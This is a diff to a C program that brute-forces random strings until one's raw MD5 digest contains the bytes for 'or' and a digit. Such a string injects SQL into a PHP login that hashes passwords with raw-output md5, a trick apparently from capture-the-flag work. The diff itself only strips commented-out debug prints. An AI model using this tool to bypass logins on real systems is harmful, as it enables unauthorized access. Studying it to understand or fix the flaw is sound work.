@@ -14,7 +14,6 @@ int main() {
   int counter;
   unsigned long long num = 0;
  
-  //MD5(string, strlen(string), result);
   //MD5 is 32 hex digits We need any 5 to be 27 4F/6F 52/72 27 31..39
   //since php is using the raw binary form of the MD5
   //'or'{not0}
@@ -27,41 +26,21 @@ int main() {
   unsigned char answer1[4] = {0x27, 0x6F, 0x72, 0x27, 0};
  
   while(1){
-    sprintf(str, "%d%d%d%d", rand(), rand(), rand(), rand()); //Generate some big random numbers
+    //Generate some big random numbers
+    sprintf(str, "%d%d%d%d", rand(), rand(), rand(), rand()); 
 
     MD5(str, strlen(str), result);
-    //To test
-    //unsigned char result[MD5_DIGEST_LENGTH] = {0x5f, 0x4d, 0xcc, 0x3b, 0x5a, 0xa7, 0x65, 0xd6, 0x27, 0x27, 0x27, 0x27, 0x4f, 0x52, 0x27, 0x31};
-
-    //printf("Tries: %llu\n", num);
-    //printf("Password: ");
-    //printf(str);
-    //printf("\nHashed pass: ");
-    //for(int i = 0; i < MD5_DIGEST_LENGTH; i++)
-    //  printf("%02x", result[i]);//
-    //printf("\n");
 
     counter = 0;
     for(int i = 0; i < MD5_DIGEST_LENGTH; i++){
       if(result[i] == answer[counter] || result[i] == answer1[counter]){
-        //printf("yes ");
-        //printf("%02x ", result[i]);
-        //printf("%02x\n", answer[counter]);
-
         counter++;
       }
       else if(result[i] == answer[0] || result[i] == answer1[0]){
-        //printf("reset ");
-        //printf("%02x ", result[i]);
-        //printf("%02x\n", answer[counter]);
         i--;
         counter = 0;
       }
       else {
-        //printf("no ");
-        //printf("%02x ", result[i]);
-        //printf("%02x\n", answer[counter]);
-
         counter = 0;
       }
 
